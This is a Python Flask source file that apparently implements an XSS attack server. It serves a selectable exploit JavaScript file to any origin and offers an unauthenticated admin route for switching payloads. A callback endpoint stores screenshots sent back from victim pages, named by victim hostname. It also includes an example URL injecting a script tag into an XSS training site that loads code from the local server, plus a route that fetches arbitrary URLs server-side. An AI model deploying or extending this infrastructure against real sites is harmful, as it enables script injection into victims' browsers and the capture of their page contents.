from flask import (
    Flask,
    send_from_directory,
    request,
    render_template_string,
    jsonify,
    render_template,
    session,
    abort,
    redirect,
    url_for
)
from flask_cors import CORS
import requests
import logging
import os
from bs4 import BeautifulSoup
from jinja2 import Environment, FileSystemLoader
from models.vulnerability import Vulnerability
from database import initialize_db, insert_payload, fetch_payloads, populate_payloads
from payload import payloads

env = Environment(loader = FileSystemLoader('templates'))
app = Flask(__name__)

CORS(app, resources={
    r"/callback": {"origins": "*"},     # Allow all origins for '/callback'
    r"/": {"origins": "*"},             # Allow all origins for '/'
})

# Path to the exploit.js file for debugging purposes
EXPLOIT_FILE_PATH = os.path.abspath("../templates/exploit/test-exploit.js")
app.config['CURRENT_FILE'] = 'test-exploit.js'

print(os.path.abspath('static/exploit.js'))

def setup():
    initialize_db()

# @app.route("/")
# def returnExploit():
#     # Log the full path for debugging
#     file_path = os.path.abspath("./templates/exploit/exploit.js")
#     print(f"Looking for file at: {file_path}")
# app.secret_key = 'your_secret_key'  # Needed for session handling
# # logging.basicConfig(level=logging.INFO)



@app.before_request
def before_request():
    # Store the current host in the context for use in templates
    request.current_host = request.host_url

# Default to 'exploit.js' for all users until changed via admin
@app.route("/", methods=["GET"])
def serve_file():
    # Get the currently selected file from the global configuration
    current_file = app.config['CURRENT_FILE']

    # Define the path to the requested file
    base_directory = os.path.abspath("./templates/exploit/") 
    file_path = os.path.join(base_directory, current_file)
    
    # Security: Prevent directory traversal
    if not file_path.startswith(base_directory):
        abort(403)  # Forbidden

    # Check if the file exists
    if not os.path.exists(file_path):
        return "File not found", 404

    # Serve the selected file
    return send_from_directory(base_directory, current_file)


@app.route("/SelectExploit", methods=["GET", "POST"])
def admin_page():
    base_directory = os.path.abspath("templates/exploit") 

    if request.method == "POST":
        # Get the new file from the form data
        new_file = request.form.get("file")
        if new_file:
            # Update the global configuration to store the current file
            app.config['CURRENT_FILE'] = new_file
            return redirect(url_for("admin_page"))

    # List all files in the exploit folder
    available_files = [f for f in os.listdir(base_directory) if os.path.isfile(os.path.join(base_directory, f))]

    # Render the admin page with the list of available files
    content = render_template("SelectExploit.html", available_files=available_files, current_file=app.config['CURRENT_FILE'])
    with open('templates/header.html', 'r') as file:
        header = file.read()
    return render_template_string(header + content)


@app.route("/dashboard")
def dashboard():
    content = render_template('dashboard-view.html')
    # Render the dashboard page with the header
    with open('templates/header.html', 'r') as file:
        header = file.read()
    return render_template_string(header + content)
    
@app.route('/payloads')
def index():
    content = render_template('payloads-view.html', payloads=payloads)
    with open('templates/header.html', 'r') as file:
        header = file.read()
    return render_template_string(header + content)

    
@app.route("/results")
def found_vulns_page():
    found_vulns = [
        Vulnerability('https://example.com', '#example', '/example'),
        Vulnerability('https://github.com', '#example', '/example'),
    ]
    content = render_template('results-view.html', found_vulns=found_vulns)
    with open('templates/header.html', 'r') as file:
        header = file.read()
    return render_template_string(header + content)

@app.route("/handle-vuln-data", methods=['POST'])
def handle_vuln_data():
    """
    Gets the vulnerable page HTML by using `requests`. This is used to be able to display a preview of the vulnerable website.
    This function might later on be (partially) replaced by html2canvas.js.
    :return:
    A string with the HTML contents of the vulnerable page that was requested.
    """
    data = request.get_json()
    if not data:
        return jsonify({"error": "No JSON data received"}), 400
    
    url = data.get('url')
    element_selector = data.get('element_selector')
    page_name = data.get('page_name')
    
    if not all([url, element_selector, page_name]):
        return jsonify({"error": "Missing required fields"}), 400
    
    # Get the HTML contents from the vulnerable page for displaying in frontend
    vulnerability = Vulnerability(url, element_selector, page_name)
    vuln_page_contents = get_page_content(url)
    
    return jsonify({"page_content": vuln_page_contents}), 200

@app.route("/exploitselect")
def select_exploit_page():
    return render_template("exploitSelect.html")

@app.route('/callback', methods=['POST'])
def handle_callback():
    # Retrieve the file from the request
    file = request.files.get('fileBlob')
    print("request is:")
    print(request)
    url = request.form.get('url') #hier moet iets aan toegevoegd worden!!!
    print(url)
    url = extract_hostname(url)
    print(url)
    # Generate the next incremented filename
    existing_files = os.listdir('./Triggers')
    png_files = [f for f in existing_files if f.endswith('.png')]
    next_index = len(png_files) + 1
    new_filename = f"{url}{next_index}.png"
    save_path = os.path.join('./Triggers', new_filename)
    
    # Save the file as a .png
    file.save(save_path)
    print(f"File saved to {save_path}")
    
    return jsonify({'status': 'Callback received', 'filename': new_filename}), 200

def extract_hostname(url):
    # Find the position of '://', which separates the scheme from the rest of the URL
    start_index = url.find('://') + 3  # Skip past '://'
    
    # Find the position of the first '/' after the '://'
    end_index = url.find('/', start_index)
    
    # If there is no '/', we take the rest of the URL as the hostname
    if end_index == -1:
        return url[start_index:]
    
    # Extract and return the hostname
    return url[start_index:end_index]

# Example usage
url = "https://xss-game.appspot.com/level1/frame?query=%3Cscript+src%3D%22http%3A%2F%2F127.0.0.1%3A5000%2F%22%3E%3C%2Fscript%3E"
hostname = extract_hostname(url)

print(f"Hostname: {hostname}")

def send_request():
    r = requests.get("https://example.com/")
    content = r.text

    soup = BeautifulSoup(content, 'html.parser')
    title = soup.title

    print("page title: " + title.text)

def get_page_content(url):
    r = requests.get(url)
    return r.text

if __name__ == '__main__':
    # initialize_db()  # Ensure the table exists
    # populate_payloads()  # Insert payloads into the database
    # payloads = fetch_payloads()  # Fetch and print all payloads
    # for payload in payloads:
    #     print(payload)
    app.run(debug=True)

